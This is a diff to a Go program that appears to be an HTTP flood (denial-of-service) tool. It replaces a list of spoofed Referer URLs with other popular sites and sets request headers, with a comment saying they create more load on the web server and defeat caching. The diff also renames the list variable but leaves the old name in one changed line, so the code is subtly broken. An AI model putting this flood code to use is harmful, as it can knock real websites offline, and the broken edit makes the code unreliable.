@@ -18,15 +18,18 @@ import (
 )
 
 var (
-	referers []string = []string{
+	referrers []string = []string{
 		"https://www.google.com/?q=",
-		"https://www.google.co.uk/?q=",
-		"https://www.google.de/?q=",
-		"https://www.google.ru/?q=",
-		"https://www.google.tk/?q=",
-		"https://www.google.cn/?q=",
-		"https://www.google.cf/?q=",
-		"https://www.google.nl/?q=",
+		"https://www.facebook.com/",
+		"https://help.baidu.com/searchResult?keywords=",
+		"https://steamcommunity.com/market/search?q=",
+		"https://www.youtube.com/",
+		"https://www.bing.com/search?q=",
+		"https://r.search.yahoo.com/",
+		"https://www.ted.com/search?q=",
+		"https://play.google.com/store/search?q=",
+		"https://vk.com/profile.php?auto=",
+		"https://www.usatoday.com/search/results?q=",
 	}
 	hostname     string
 	param_joiner string
@@ -60,7 +63,7 @@ func get() {
 	req.Header.Set("User-Agent", uarand.GetRandom())
 	req.Header.Add("Pragma", "no-cache")                                                     // used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
 	req.Header.Add("Cache-Control", "no-store, no-cache")                                    // creates more load on web server
-	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5)) // uses random referer from list
+	req.Header.Set("Referer", referrers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5)) // uses random referer from list
 	req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
 	req.Header.Set("Connection", "keep-alive")
 
